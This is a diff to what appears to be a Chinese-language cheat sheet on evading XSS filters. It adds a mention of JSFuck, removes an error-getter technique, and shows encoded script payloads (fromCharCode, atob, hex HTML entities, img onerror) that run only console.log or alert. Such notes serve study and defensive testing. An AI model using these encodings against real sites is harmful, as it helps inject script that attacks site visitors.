@@ -262,6 +262,7 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 
 - 不使用等号`=`(equal sign)
 
+>[JSFuck](http://www.jsfuck.com/) 优点是只使用6个字符`()[]!+` 即可执行任意JavaScript代码. 缺点是太长了.
 ```
 # 执行JavaScript语句 console.log(666)
 
@@ -269,10 +270,7 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 <script>eval(String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103,40,54,54,54,41))</script>
 <script>eval(atob`Y29uc29sZS5sb2coNjY2KQ`)</script>
 
-# 方法2: 定义错误 触发错误
-<script>ReferenceError.prototype.__defineGetter__('name', function(){co\u006esole.log(666)}),x</script>
-
-# 方法3: HTML Entity (Hexadecimal)
+# 方法2: HTML Entity (Hexadecimal)
 # 优点: 不出现许多符号 如 = " ' ( ) ; 等
 <svg><script>&#x63&#x6f&#x6e&#x73&#x6f&#x6c&#x65&#x2e&#x6c&#x6f&#x67&#x28&#x36&#x36&#x36&#x29</script><svg>
 
